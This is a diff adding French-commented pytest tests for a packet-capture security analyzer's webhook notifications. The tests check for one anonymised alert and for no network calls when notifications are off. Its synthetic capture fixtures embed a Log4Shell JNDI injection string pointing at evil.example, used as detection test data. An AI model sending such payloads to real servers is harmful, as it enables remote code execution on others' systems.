@@ -178,3 +178,59 @@ def test_pcap_legitime_sans_base_cve_ne_pretend_pas_avoir_verifie(monkeypatch, c
     assert "Aucune base CVE fournie (--cve-db)" in out
     assert "score de risque global : 0/100" in out
     assert "CVE confirmees : 0" in out
+
+
+# -- notifications (issue #280) sur la chaine complete ---------------------------------
+
+
+def test_pcap_notification_webhook_resume_anonymise(monkeypatch, capsys, tmp_path, cve_db):
+    import json
+    import threading
+    from http.server import BaseHTTPRequestHandler, HTTPServer
+
+    bodies = []
+
+    class Handler(BaseHTTPRequestHandler):
+        def do_POST(self):
+            bodies.append(json.loads(self.rfile.read(int(self.headers["Content-Length"]))))
+            self.send_response(200)
+            self.end_headers()
+
+        def log_message(self, *_a):
+            pass
+
+    server = HTTPServer(("127.0.0.1", 0), Handler)
+    threading.Thread(target=server.serve_forever, daemon=True).start()
+    monkeypatch.chdir(tmp_path)
+    pcap = tmp_path / "attaque.pcap"
+    log4shell = _request("/", {"User-Agent": "${jndi:ldap://evil.example/a}"})
+    _write_http_capture(pcap, [_request("/"), log4shell], "Apache/2.4.49 (Unix)")
+    argv = ["cross_capture_analyzer_cli.py", "--capture", f"LAN={pcap}", "--security-report", "--cve-db", str(cve_db)]
+    argv += ["--notify-on", "elevee", "--notify-webhook", f"http://127.0.0.1:{server.server_address[1]}/h"]
+    argv += ["--notify-state", str(tmp_path / "state.json")]
+    monkeypatch.setattr(sys, "argv", argv)
+    try:
+        cli.main()
+    finally:
+        server.shutdown()
+        server.server_close()
+    out = capsys.readouterr().out
+    assert "notification webhook : envoyee" in out
+    assert len(bodies) == 1  # une notification pour toute l'analyse
+    body = json.dumps(bodies[0])
+    assert bodies[0]["level"] == "critique"
+    assert SERVER not in body and CLIENT not in body and "Apache/2.4.49" not in body
+
+
+def test_pcap_sans_notify_on_aucun_appel_reseau(monkeypatch, capsys, tmp_path, cve_db):
+    def refuse(*_a, **_k):
+        raise AssertionError("appel reseau interdit")
+
+    monkeypatch.setenv("NETCROSS_SLACK_WEBHOOK", "https://hooks.example/s")
+    monkeypatch.setattr(socket, "socket", refuse)
+    monkeypatch.setattr(socket, "create_connection", refuse)
+    pcap = tmp_path / "attaque.pcap"
+    _write_http_capture(pcap, [_request("/", {"User-Agent": "${jndi:ldap://evil.example/a}"})], "Apache/2.4.49")
+    out = _run_security_report(monkeypatch, capsys, pcap, cve_db)
+    assert "(niveau : critique)" in out
+    assert "Notifications" not in out
